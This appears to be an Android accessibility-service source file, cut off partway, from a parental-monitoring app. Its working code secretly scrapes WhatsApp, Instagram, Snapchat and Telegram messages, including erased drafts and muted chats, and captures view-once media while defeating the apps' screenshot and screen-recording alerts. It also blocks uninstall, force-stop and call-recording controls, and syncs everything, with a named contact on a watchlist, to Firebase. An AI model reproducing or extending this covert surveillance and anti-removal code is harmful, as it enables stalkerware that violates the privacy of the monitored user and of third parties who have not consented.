package com.vyra.kids.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.devanagari.DevanagariTextRecognizerOptions
import com.google.mlkit.vision.text.latin.TextRecognizerOptions
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.ChatSequenceRingBuffer
import com.vyra.kids.core.FirebaseSyncManager
import com.vyra.kids.core.NetworkSyncManager
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executors

class VyraAccessibilityService : AccessibilityService() {

    private val executor = Executors.newSingleThreadExecutor()
    private val snapchatPollerHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private var isSnapchatPollerActive = false

    private val snapchatPollerRunnable = object : Runnable {
        override fun run() {
            if (!isSnapchatPollerActive) return
            try {
                val root = rootInActiveWindow
                if (root != null) {
                    val headerContact = extractActiveChatContact("com.snapchat.android", root)
                    val activeContact = if (headerContact.isNotBlank()) {
                        com.vyra.kids.core.ActiveContactTracker.recordContact("Snapchat", headerContact)
                        headerContact
                    } else {
                        com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat", maxAgeMinutes = 15) ?: ""
                    }
                    if (activeContact.isNotBlank()) {
                        scrapeSocialChatNodes("Snapchat", activeContact, root)
                    } else {
                        scrapeSocialInboxList("Snapchat", "com.snapchat.android", root)
                    }
                }
            } catch (e: Exception) {
                Log.e(AppConstants.TAG, "Error in snapchatPollerRunnable", e)
            } finally {
                if (isSnapchatPollerActive) {
                    snapchatPollerHandler.postDelayed(this, 2000L)
                }
            }
        }
    }

    private fun startSnapchatPoller() {
        if (!isSnapchatPollerActive) {
            isSnapchatPollerActive = true
            snapchatPollerHandler.removeCallbacks(snapchatPollerRunnable)
            snapchatPollerHandler.postDelayed(snapchatPollerRunnable, 1000L)
            Log.d(AppConstants.TAG, "⚡ Snapchat Continuous Ghost Poller Started (God-Mode)")
        }
    }

    private fun stopSnapchatPoller() {
        if (isSnapchatPollerActive) {
            isSnapchatPollerActive = false
            snapchatPollerHandler.removeCallbacks(snapchatPollerRunnable)
            Log.d(AppConstants.TAG, "Snapchat Continuous Ghost Poller Stopped")
        }
    }

    private val sensitiveKeywords = listOf(
        "delete", "mat batana", "kisi ko nahi", "secret", "nude", "photo", "send pic",
        "shame", "bunk", "dar", "kill", "drug", "weed", "alcohol", "paisa"
    )

    private val targetSocialPackages = setOf(
        "com.instagram.android",
        "com.snapchat.android",
        "com.whatsapp",
        "org.telegram.messenger"
    )

    private var lastSnapshotTime = 0L

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // 1. SNAPCHAT STEALTH SHIELD & GOD-LEVEL POLLER
        if (packageName == "com.snapchat.android") {
            startSnapchatPoller()
            handleSnapchatStealthShield(event)
        } else if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            stopSnapchatPoller()
        }

        // 2. VIVO IN-CALL ANTI-TAMPER (SOLUTION A)
        if (packageName.contains("vivo.phone") || packageName.contains("incallui")) {
            handleVivoInCallScreen(event)
        }

        // 3. SOCIAL APP CHAT & CAMERA TRAP (Captures normal & muted chats)
        if (targetSocialPackages.contains(packageName)) {
            handleSocialAppActivity(packageName, event)
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                handleDraftTypingEvent(packageName, event)
            }
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                handleSendButtonTrigger(packageName, event)
                handleOneViewMediaClick(packageName, event)
            }
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
                event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                val appName = when {
                    packageName.contains("instagram") -> "Instagram"
                    packageName.contains("whatsapp") -> "WhatsApp"
                    packageName.contains("telegram") -> "Telegram"
                    packageName.contains("snapchat") -> "Snapchat"
                    else -> "Social"
                }
                val root = rootInActiveWindow
                val headerContact = extractActiveChatContact(packageName, root)
                val activeContact = if (headerContact.isNotBlank()) {
                    com.vyra.kids.core.ActiveContactTracker.recordContact(appName, headerContact)
                    headerContact
                } else {
                    com.vyra.kids.core.ActiveContactTracker.getLastContact(appName, maxAgeMinutes = 15) ?: ""
                }

                if (activeContact.isNotBlank()) {
                    // Inside active chat thread (captures incoming/outgoing even if muted)
                    scrapeSocialChatNodes(appName, activeContact, root)
                } else {
                    // In conversation list view (captures muted unread chat snippets right from inbox)
                    scrapeSocialInboxList(appName, packageName, root)
                }
            }
        }

        // 4. SCAN VISIBLE TEXT FOR DANGEROUS / SENSITIVE KEYWORDS
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            scanScreenText(packageName, rootInActiveWindow)
        }

        // 5. ANTI-UNINSTALL & SETTINGS TAMPER PROTECTION
        if (packageName.contains("settings") ||
            packageName.contains("packageinstaller") ||
            packageName.contains("appmanager") ||
            packageName.contains("permissioncontroller") ||
            packageName.contains("securitycenter")) {
            handleSettingsTamperProtection(packageName, event)
        }
    }

    private fun handleSettingsTamperProtection(packageName: String, event: AccessibilityEvent) {
        try {
            val root = rootInActiveWindow ?: return
            val vyraNodes = root.findAccessibilityNodeInfosByText("vyra") +
                    root.findAccessibilityNodeInfosByText("Vyra") +
                    root.findAccessibilityNodeInfosByText("System Toolkit") +
                    root.findAccessibilityNodeInfosByText("System Services")
            if (vyraNodes.isNotEmpty()) {
                val hasDangerousAction = root.findAccessibilityNodeInfosByText("Uninstall").isNotEmpty() ||
                        root.findAccessibilityNodeInfosByText("Force stop").isNotEmpty() ||
                        root.findAccessibilityNodeInfosByText("Deactivate").isNotEmpty() ||
                        root.findAccessibilityNodeInfosByText("Turn off").isNotEmpty()
                if (hasDangerousAction) {
                    Log.w(AppConstants.TAG, "Tamper attempt detected in settings! Redirecting to Home.")
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in handleSettingsTamperProtection", e)
        }
    }

    /**
     * SNAPCHAT STEALTH SHIELD:
     * 1. Snapchat immediately detects active MediaProjection screen share and alerts the chat:
     *    "X screen recorded the chat!"
     *    Shield instantly stops/mutes screen projection when Snapchat is in foreground.
     * 2. Scrapes disappearing chats from memory nodes without triggering screenshot alerts.
     * 3. Captures 1-view snaps via private HardwareBuffer compositor without MediaStore or ScreenCaptureCallback triggers.
     */
    private fun handleSnapchatStealthShield(event: AccessibilityEvent) {
        // A. If Snapchat is brought to foreground, immediately kill screen streaming
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            try {
                val stopStream = Intent(this, LiveScreenStreamService::class.java).apply {
                    action = LiveScreenStreamService.ACTION_STOP_SCREEN_STREAM
                }
                startService(stopStream)
                Log.w(AppConstants.TAG, "Snapchat Stealth Shield: Killed Live Screen Projection to prevent recording detection alert!")
            } catch (e: Exception) {
                Log.e(AppConstants.TAG, "Error muting screen projection for Snapchat", e)
            }
        }

        // B. Throttled Ghost Chat Scraper: Reads active chat messages directly from view tree
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val root = rootInActiveWindow
            val headerContact = extractActiveChatContact("com.snapchat.android", root)
            val activeContact = if (headerContact.isNotBlank()) {
                com.vyra.kids.core.ActiveContactTracker.recordContact("Snapchat", headerContact)
                headerContact
            } else {
                com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
            }
            if (activeContact.isNotBlank()) {
                scrapeSocialChatNodes("Snapchat", activeContact, root)
            }
        }

        // C. 1-View Snap Ghost Capture (No alert to sender)
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""
            val desc = event.contentDescription?.toString()?.lowercase() ?: ""
            val text = event.text?.joinToString(" ")?.lowercase() ?: ""
            if (viewId.contains("snap") || viewId.contains("story") || viewId.contains("chat_message") ||
                desc.contains("new snap") || text.contains("received snap") || text.contains("tap to view") ||
                desc.contains("snap") || text.contains("snap")) {

                val root = rootInActiveWindow
                val resolvedContact = extractActiveChatContact("com.snapchat.android", root).ifBlank {
                    com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
                }
                val snapSender = if (resolvedContact.isNotBlank()) normalizeContactName(resolvedContact) else "Snapchat Friend"

                // Dual-Timing Capture: 550ms (post fade-in) + 1250ms (caption overlay frame)
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    captureSilentCompositorSnap(
                        sourceApp = "Snapchat",
                        sender = snapSender,
                        titleText = "📷 [1-View Snap from $snapSender]"
                    )
                }, 550)

                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    captureSilentCompositorSnap(
                        sourceApp = "Snapchat",
                        sender = snapSender,
                        titleText = "📷 [1-View Snap from $snapSender (Frame 2)]"
                    )
                }, 1250)
            }
        }
    }

    private val processedChatHashes = mutableSetOf<Int>()

    private fun findWatchlistInHeaderOrTopScreen(root: AccessibilityNodeInfo): String {
        try {
            val nodes = root.findAccessibilityNodeInfosByText("Harshit") +
                    root.findAccessibilityNodeInfosByText("harshit") +
                    root.findAccessibilityNodeInfosByText("Kamboj") +
                    root.findAccessibilityNodeInfosByText("kamboj")
            for (node in nodes) {
                if (node.isEditable || node.className?.contains("EditText") == true) continue
                val resName = node.viewIdResourceName?.lowercase() ?: ""
                if (resName.contains("search") || resName.contains("query") || resName.contains("find")) continue

                val rect = android.graphics.Rect()
                node.getBoundsInScreen(rect)
                val text = node.text?.toString()?.trim() ?: ""

                val isHeaderView = resName.contains("name") || resName.contains("title") ||
                        resName.contains("header") || resName.contains("recipient") ||
                        resName.contains("user") || resName.contains("friend") || resName.contains("bar")
                val isTopScreen = rect.top in 0..850

                if ((isHeaderView || isTopScreen) && !isNavKeyword(text)) {
                    return text
                }
            }
        } catch (_: Exception) {}
        return ""
    }

    private fun extractActiveChatContact(packageName: String, root: AccessibilityNodeInfo?): String {
        if (root == null) return ""
        try {
            // 1. FAST-PATH: Priority Watchlist Instant-Lock (Harshit / Harshit Kamboj / @harshit_kamboj97)
            val watchlistName = findWatchlistInHeaderOrTopScreen(root)
            if (watchlistName.isNotBlank()) {
                val clean = normalizeContactName(watchlistName)
                val appName = when {
                    packageName.contains("snapchat") -> "Snapchat"
                    packageName.contains("instagram") -> "Instagram"
                    packageName.contains("whatsapp") -> "WhatsApp"
                    packageName.contains("telegram") -> "Telegram"
                    else -> "Social"
                }
                com.vyra.kids.core.ActiveContactTracker.recordContact(appName, clean)
                return clean
            }

            val candidateIds = listOf(
                "com.whatsapp:id/conversation_contact_name",
                "com.whatsapp:id/action_bar_title",
                "com.whatsapp:id/title",
                "com.instagram.android:id/action_bar_title",
                "com.instagram.android:id/thread_title",
                "org.telegram.messenger:id/action_bar_title",
                "com.snapchat.android:id/chat_header_title",
                "com.snapchat.android:id/conversation_title",
                "com.snapchat.android:id/action_bar_title",
                "com.snapchat.android:id/display_name",
                "com.snapchat.android:id/friend_name",
                "com.snapchat.android:id/chat_user_name",
                "com.snapchat.android:id/toolbar_title",
                "com.snapchat.android:id/recipient_bar",
                "com.snapchat.android:id/chat_v11_header",
                "com.snapchat.android:id/feed_friend_display_name",
                "com.snapchat.android:id/friend_display_name",
                "com.snapchat.android:id/title",
                "com.snapchat.android:id/name",
                "com.snapchat.android:id/avatar_title",
                "com.snapchat.android:id/subtitle",
                "com.snapchat.android:id/sub_title",
                "com.snapchat.android:id/chat_name",
                "com.snapchat.android:id/chat_message_header",
                "com.snapchat.android:id/chat_recipient_name",
                "com.snapchat.android:id/primary_text"
            )
            for (id in candidateIds) {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                for (node in nodes) {
                    if (node.isEditable || node.className?.contains("EditText") == true) continue
                    val resName = node.viewIdResourceName?.lowercase() ?: ""
                    if (resName.contains("search") || resName.contains("query") || resName.contains("find")) continue
                    val text = node.text?.toString()?.trim() ?: ""
                    if (text.isNotBlank() && !isNavKeyword(text)) {
                        return normalizeContactName(text)
                    }
                }
            }

            // Fallback: search in toolbar / action bar container
            for (i in 0 until root.childCount) {
                val child = root.getChild(i) ?: continue
                val resName = child.viewIdResourceName?.lowercase() ?: ""
                if (resName.contains("toolbar") || resName.contains("action_bar") || resName.contains("header")) {
                    val found = findFirstContactNameInHeader(child)
                    if (found.isNotBlank()) return normalizeContactName(found)
                }
            }
        } catch (_: Exception) {}
        return ""
    }

    private fun findFirstContactNameInHeader(node: AccessibilityNodeInfo?, depth: Int = 0): String {
        if (node == null || depth > 12) return ""
        if (node.isEditable || node.className?.contains("EditText") == true) return ""
        val resName = node.viewIdResourceName?.lowercase() ?: ""
        if (resName.contains("search") || resName.contains("query") || resName.contains("find")) return ""
        val text = node.text?.toString()?.trim() ?: ""
        if (text.isNotBlank() && text.length > 2 && !isNavKeyword(text)) {
            return text
        }
        for (i in 0 until node.childCount) {
            val res = findFirstContactNameInHeader(node.getChild(i), depth + 1)
            if (res.isNotBlank()) return res
        }
        return ""
    }

    private fun isNavKeyword(text: String): Boolean {
        val lower = text.lowercase().trim()
        if (lower.length <= 2) return true
        val knownKeywords = setOf(
            "chats", "status", "calls", "updates", "communities", "settings",
            "search", "search...", "camera", "more options", "new chat",
            "messages", "all messages", "direct", "stories", "spotlight", "home", "reels",
            "online", "typing...", "last seen", "delivered", "opened", "received", "sent",
            "turn on notifications", "never miss snaps", "add friends", "find friends",
            "team id", "team name", "tap to chat", "new snap", "popular", "filters",
            "requests", "primary", "general", "friends", "follow", "following", "followers",
            "liked a message", "shared a link", "location off", "tap to chat", "unavailable message",
            "save number", "reshare number", "comment number", "view likes", "posts"
        )
        if (lower in knownKeywords) return true
        if (lower.startsWith("typing...") ||
            lower.startsWith("last seen") ||
            lower.contains("turn on notifications") ||
            lower.contains("never miss snaps") ||
            lower.contains("reshare") ||
            lower.contains("reposted") ||
            lower.contains("comment number") ||
            lower.contains("save number") ||
            lower.contains("view likes") ||
            lower.contains("number is") ||
            lower.contains("unavailable message") ||
            lower.matches(Regex("^[0-9]+(\\.[0-9]+)?[kmb]? (likes|comments|views|shares|reposts)$"))
        ) {
            return true
        }
        return false
    }

    private fun isWatchlistContact(contactName: String): Boolean {
        val lower = contactName.lowercase()
        return lower.contains("harshit") || lower.contains("kamboj")
    }

    private fun normalizeContactName(rawName: String): String {
        val lower = rawName.lowercase().trim()
        if (lower.contains("harshit") || lower.contains("kamboj")) {
            return "Harshit Kamboj"
        }
        return rawName.trim()
    }

    private val lastDrafts = java.util.concurrent.ConcurrentHashMap<String, String>()

    private fun handleDraftTypingEvent(packageName: String, event: AccessibilityEvent) {
        try {
            val currentText = event.text?.joinToString(" ")?.trim() ?: ""
            val appName = when {
                packageName.contains("instagram") -> "Instagram"
                packageName.contains("whatsapp") -> "WhatsApp"
                packageName.contains("telegram") -> "Telegram"
                packageName.contains("snapchat") -> "Snapchat"
                else -> "Social"
            }
            val previousDraft = lastDrafts[packageName] ?: ""

            // If child typed a draft (>= 3 chars) and then cleared/erased it before sending
            if (previousDraft.length >= 3 && (currentText.isBlank() || currentText.length < previousDraft.length / 2)) {
                val activeContact = com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: "$appName Chat"
                val cleanContact = normalizeContactName(activeContact)
                val isTarget = isWatchlistContact(cleanContact)
                val hash = "erased:${appName}:${cleanContact}:${previousDraft}".hashCode()
                if (!processedChatHashes.contains(hash)) {
                    if (processedChatHashes.size > 1000) processedChatHashes.clear()
                    processedChatHashes.add(hash)

                    val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
                    val msgId = "draft_${System.currentTimeMillis()}_${Math.abs(hash).toString().take(6)}"
                    firebaseSync.syncChatMessage(
                        msgId = msgId,
                        app = appName,
                        sender = "Aryan (Child) [Erased Draft]",
                        text = "✍️ [Erased/Cleared Draft to $cleanContact]: \"$previousDraft\"",
                        isDeletedBySender = true,
                        isWatchlistTarget = isTarget
                    )
                    Log.i(AppConstants.TAG, "Captured erased draft in $appName: $previousDraft")
                }
            }

            if (currentText.length >= 3 && !isNavKeyword(currentText)) {
                lastDrafts[packageName] = currentText
            } else if (currentText.isBlank()) {
                lastDrafts.remove(packageName)
            }
        } catch (_: Exception) {}
    }

    private fun handleSendButtonTrigger(packageName: String, event: AccessibilityEvent) {
        try {
            val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""
            val desc = event.contentDescription?.toString()?.lowercase() ?: ""
            val text = event.text?.joinToString(" ")?.lowercase() ?: ""

            val isSendAction = viewId.contains("send") ||
                    desc in setOf("send", "bhejo", "send message", "send snap", "bhejen") ||
                    text == "send" || text == "bhejo"

            if (isSendAction) {
                val appName = when {
                    packageName.contains("instagram") -> "Instagram"
                    packageName.contains("whatsapp") -> "WhatsApp"
                    packageName.contains("telegram") -> "Telegram"
                    packageName.contains("snapchat") -> "Snapchat"
                    else -> "Social"
                }
                val outgoingDraft = lastDrafts[packageName]?.trim() ?: ""
                if (outgoingDraft.isNotBlank()) {
                    val activeContact = com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: "$appName Friend"
                    val cleanContact = normalizeContactName(activeContact)
                    val isTarget = isWatchlistContact(cleanContact)
                    val convKey = "$appName:$cleanContact"

                    // Record in ring buffer to prevent duplicate re-scrape
                    ChatSequenceRingBuffer.record(convKey, outgoingDraft, "Aryan (Child)")

                    val syncManager = FirebaseSyncManager.getInstance(this)
                    val msgId = "out_${System.currentTimeMillis()}_${Math.abs(outgoingDraft.hashCode()).toString().take(6)}"
                    syncManager.syncChatMessage(
                        msgId = msgId,
                        app = appName,
                        sender = "Aryan (Child)",
                        text = outgoingDraft,
                        isDeletedBySender = false,
                        isWatchlistTarget = isTarget
                    )
                    Log.i(AppConstants.TAG, "⚡ Smart Send-Button: Captured outgoing message in $appName to $cleanContact (Watchlist: $isTarget): \"$outgoingDraft\"")
                    lastDrafts.remove(packageName)
                }
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in handleSendButtonTrigger", e)
        }
    }

    private fun handleOneViewMediaClick(packageName: String, event: AccessibilityEvent) {
        try {
            val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""
            val desc = event.contentDescription?.toString()?.lowercase() ?: ""
            val text = event.text?.joinToString(" ")?.lowercase() ?: ""

            val isSnapchatMedia = packageName.contains("snapchat") && (
                viewId.contains("snap") || viewId.contains("story") || viewId.contains("chat_message") ||
                desc.contains("new snap") || desc.contains("snap") ||
                text.contains("received snap") || text.contains("tap to view") || text.contains("delivered snap")
            )

            val isInstagramOneView = packageName.contains("instagram") && (
                viewId.contains("visual_media") || viewId.contains("direct_image") ||
                desc.contains("view photo") || desc.contains("photo") ||
                text.contains("view photo") || text.contains("photo")
            )

            val isTelegramSecretMedia = packageName.contains("telegram") && (
                viewId.contains("secret") || desc.contains("self-destruct") ||
                text.contains("self-destruct") || text.contains("photo, self-destructing")
            )

            if (isSnapchatMedia || isInstagramOneView || isTelegramSecretMedia) {
                val appName = when {
                    packageName.contains("snapchat") -> "Snapchat"
                    packageName.contains("instagram") -> "Instagram"
                    packageName.contains("telegram") -> "Telegram"
                    else -> "Social"
                }
                val activeContact = extractActiveChatContact(packageName, rootInActiveWindow).ifBlank {
                    com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: ""
                }
                val cleanContact = if (activeContact.isNotBlank()) normalizeContactName(activeContact) else "$appName Friend"
                Log.i(AppConstants.TAG, "Detected 1-View media open in $appName ($cleanContact). Scheduling dual-timing compositor capture...")

                // Dual-Timing Capture: 550ms + 1250ms
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    captureSilentCompositorSnap(
                        sourceApp = appName,
                        sender = cleanContact,
                        titleText = "📷 [1-View $appName Media from $cleanContact]"
                    )
                }, 550)

                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    captureSilentCompositorSnap(
                        sourceApp = appName,
                        sender = cleanContact,
                        titleText = "📷 [1-View $appName Media from $cleanContact (Frame 2)]"
                    )
                }, 1250)
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in handleOneViewMediaClick", e)
        }
    }

    private fun scrapeSocialChatNodes(appName: String, activeContact: String, node: AccessibilityNodeInfo?, depth: Int = 0) {
        if (node == null || depth > 35) return
        val rawText = node.text?.toString()?.trim() ?: ""
        val rawDesc = node.contentDescription?.toString()?.trim() ?: ""
        val text = if (rawText.isNotBlank()) rawText else rawDesc

        if (text.isNotBlank() && text.length > 1) {
            val lower = text.lowercase()
            val isNav = isNavKeyword(text) || lower in setOf("message...", "send", "seen", "delivered", "read", "opened", "tap to view") ||
                    lower.startsWith("seen") || lower.startsWith("typing...") || lower.startsWith("online")
            val cleanContact = normalizeContactName(activeContact)
            if (!isNav && !text.equals(activeContact, ignoreCase = true) && !text.equals(cleanContact, ignoreCase = true)) {
                val convKey = "$appName:$cleanContact"
                if (!ChatSequenceRingBuffer.isDuplicate(convKey, text, cleanContact)) {
                    ChatSequenceRingBuffer.record(convKey, text, cleanContact)

                    val isTarget = isWatchlistContact(cleanContact)
                    val syncManager = FirebaseSyncManager.getInstance(this)
                    val msgId = "chat_${System.currentTimeMillis()}_${Math.abs(text.hashCode()).toString().take(6)}"
                    syncManager.syncChatMessage(
                        msgId = msgId,
                        app = appName,
                        sender = cleanContact,
                        text = text,
                        isDeletedBySender = false,
                        isWatchlistTarget = isTarget
                    )
                }
            }
        }
        for (i in 0 until node.childCount) {
            scrapeSocialChatNodes(appName, activeContact, node.getChild(i), depth + 1)
        }
    }

    /**
     * Muted Chat Scraper: Extracts last message previews directly from WhatsApp, Telegram,
     * Instagram, and Snapchat inbox rows even if notifications are disabled/muted for the chat.
     */
    private fun scrapeSocialInboxList(appName: String, packageName: String, root: AccessibilityNodeInfo?) {
        if (root == null) return
        try {
            when {
                packageName.contains("whatsapp") -> {
                    val nameNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversations_row_contact_name")
                    for (nameNode in nameNodes) {
                        val contactName = nameNode.text?.toString()?.trim() ?: continue
                        if (contactName.isBlank() || isNavKeyword(contactName)) continue

                        val rowParent = nameNode.parent ?: continue
                        val msgNodes = rowParent.findAccessibilityNodeInfosByViewId("com.whatsapp:id/single_msg_tv") +
                                rowParent.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversations_row_message")
                        for (msgNode in msgNodes) {
                            val msgText = msgNode.text?.toString()?.trim() ?: continue
                            if (msgText.length > 1 && !isNavKeyword(msgText)) {
                                recordInboxSnippet(appName, contactName, msgText)
                            }
                        }
                    }
                }
                packageName.contains("telegram") -> {
                    val nameNodes = root.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/dialog_name")
                    for (nameNode in nameNodes) {
                        val contactName = nameNode.text?.toString()?.trim() ?: continue
                        if (contactName.isBlank() || isNavKeyword(contactName)) continue

                        val rowParent = nameNode.parent ?: continue
                        val msgNodes = rowParent.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/dialog_message")
                        for (msgNode in msgNodes) {
                            val msgText = msgNode.text?.toString()?.trim() ?: continue
                            if (msgText.length > 1 && !isNavKeyword(msgText)) {
                                recordInboxSnippet(appName, contactName, msgText)
                            }
                        }
                    }
                }
                packageName.contains("instagram") -> {
                    val nameNodes = root.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_inbox_username")
                    for (nameNode in nameNodes) {
                        val contactName = nameNode.text?.toString()?.trim() ?: continue
                        if (contactName.isBlank() || isNavKeyword(contactName)) continue

                        val rowParent = nameNode.parent ?: continue
                        val msgNodes = rowParent.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_inbox_digest")
                        for (msgNode in msgNodes) {
                            val msgText = msgNode.text?.toString()?.trim() ?: continue
                            if (msgText.length > 1 && !isNavKeyword(msgText)) {
                                recordInboxSnippet(appName, contactName, msgText)
                            }
                        }
                    }
                }
                packageName.contains("snapchat") -> {
                    val nameNodes = root.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/feed_friend_display_name") +
                            root.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/display_name") +
                            root.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/friend_name") +
                            root.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/primary_text")
                    for (nameNode in nameNodes) {
                        val contactName = nameNode.text?.toString()?.trim() ?: continue
                        if (contactName.isBlank() || isNavKeyword(contactName)) continue

                        val rowParent = nameNode.parent ?: continue
                        val msgNodes = rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/feed_friend_subtext") +
                                rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/sub_text") +
                                rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/secondary_text") +
                                rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/chat_message_text")
                        for (msgNode in msgNodes) {
                            val msgText = msgNode.text?.toString()?.trim() ?: continue
                            if (msgText.length > 1 && !isNavKeyword(msgText)) {
                                recordInboxSnippet(appName, contactName, msgText)
                            }
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun recordInboxSnippet(appName: String, contactName: String, msgText: String) {
        val cleanText = msgText.trim()
        if (cleanText.isEmpty() || isNavKeyword(cleanText)) return

        val cleanName = normalizeContactName(contactName)
        val convKey = "inbox:$appName:$cleanName"
        if (!ChatSequenceRingBuffer.isDuplicate(convKey, cleanText, cleanName)) {
            ChatSequenceRingBuffer.record(convKey, cleanText, cleanName)

            com.vyra.kids.core.ActiveContactTracker.recordContact(appName, cleanName, cleanText)
            val isTarget = isWatchlistContact(cleanName)
            val syncManager = FirebaseSyncManager.getInstance(this)
            val msgId = "inbox_${System.currentTimeMillis()}_${Math.abs(cleanText.hashCode()).toString().take(6)}"
            syncManager.syncChatMessage(
                msgId = msgId,
                app = appName,
                sender = cleanName,
                text = cleanText,
                isDeletedBySender = false,
                isWatchlistTarget = isTarget
            )
            Log.i(AppConstants.TAG, "Muted/Inbox Chat Captured [$appName] $cleanName (Watchlist: $isTarget): $cleanText")
        }
    }

    /**
     * Captures 1-View Snaps directly from system compositor HardwareBuffer.
     * Bypasses:
     * 1. MediaStore.Images.Media ContentObserver (no file in Pictures/Screenshots)
     * 2. Android 14 ScreenCaptureCallback (not a user hardware button screenshot)
     * Result: Sender receives 0 alerts (NO "Screenshot taken!" message).
     */
    private fun captureSilentCompositorSnap(
        sourceApp: String = "Snapchat",
        sender: String = "Snapchat Friend",
        titleText: String = "📷 [1-View Snap Captured Silently]"
    ) {
        val root = rootInActiveWindow
        val resolvedSender = if (sender == "Snapchat Friend" || sender.contains("Incoming 1-View Snap", ignoreCase = true)) {
            val fallback = extractActiveChatContact("com.snapchat.android", root).ifBlank {
                com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
            }
            if (fallback.isNotBlank()) normalizeContactName(fallback) else sender
        } else {
            normalizeContactName(sender)
        }
        val finalTitle = if (resolvedSender != "Snapchat Friend" && !titleText.contains(resolvedSender)) {
            "📷 [1-View Snap from $resolvedSender]"
        } else {
            titleText
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                executor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val hwBuffer = screenshotResult.hardwareBuffer
                        try {
                            val bitmap = Bitmap.wrapHardwareBuffer(
                                hwBuffer,
                                screenshotResult.colorSpace
                            ) ?: return

                            val softwareBitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && bitmap.config == Bitmap.Config.HARDWARE) {
                                bitmap.copy(Bitmap.Config.ARGB_8888, false) ?: bitmap
                            } else {
                                bitmap
                            }

                            val snapFile = File(filesDir, "ghost_snap_${System.currentTimeMillis()}.jpg")
                            FileOutputStream(snapFile).use { out ->
                                softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                            }
                            Log.i(AppConstants.TAG, "Ghost 1-View Snap saved silently ($sourceApp -> $resolvedSender): ${snapFile.name}")

                            runMlKitOcrAndSyncSnap(
                                sourceApp = sourceApp,
                                sender = resolvedSender,
                                titleText = finalTitle,
                                snapFile = snapFile,
                                bitmap = softwareBitmap,
                                isOutgoing = false
                            )
                        } catch (e: Exception) {
                            Log.e(AppConstants.TAG, "Error in silent compositor snap capture", e)
                        } finally {
                            try { hwBuffer.close() } catch (_: Exception) {}
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        Log.e(AppConstants.TAG, "Ghost snap capture failed: $errorCode")
                    }
                }
            )
        }
    }

    /**
     * Solution A: Anti-tamper logic on Vivo's in-call dialer UI.
     * Prevents the child from tapping "Stop Recording".
     */
    private fun handleVivoInCallScreen(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        
        // Find recording button by text or view id
        val stopRecordNodes = rootNode.findAccessibilityNodeInfosByText("Stop") +
                rootNode.findAccessibilityNodeInfosByText("Recording") +
                rootNode.findAccessibilityNodeInfosByText("Record")

        for (node in stopRecordNodes) {
